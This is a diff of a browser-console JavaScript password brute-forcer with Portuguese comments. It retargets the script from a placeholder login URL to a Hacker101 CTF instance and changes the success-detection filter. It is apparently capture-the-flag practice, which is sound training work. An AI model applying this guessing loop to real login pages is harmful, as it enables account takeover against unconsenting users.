@@ -11,7 +11,7 @@ fetch(url)
 
     // ajustar a url do alvo antes de enviar
     // to pensando em adaptar com input no console ou com prompt para a próxima versão
-    const loginUrl = 'https://alvo.com/login';
+    const loginUrl = 'https://ffaa83c05e99272efeef617499dc7c28.ctf.hacker101.com/login';
 
     (async () => {
       for (const password of passwords) {
@@ -30,10 +30,9 @@ fetch(url)
       //  sim... pura gambiarra. Podia fazer melhor? Podia! kkk
         });
 
-
         const body = await res.text();
         // ajustar filtro de parada, não me julguém, eu acho esse método mais eficiente na maioria dos casos
-        if (!body.toLowerCase().includes('user')) {
+        if (!body.includes('Unknow')) {
           console.log(`sucesso: %c${password}`, `color: green`);
           break;
         }
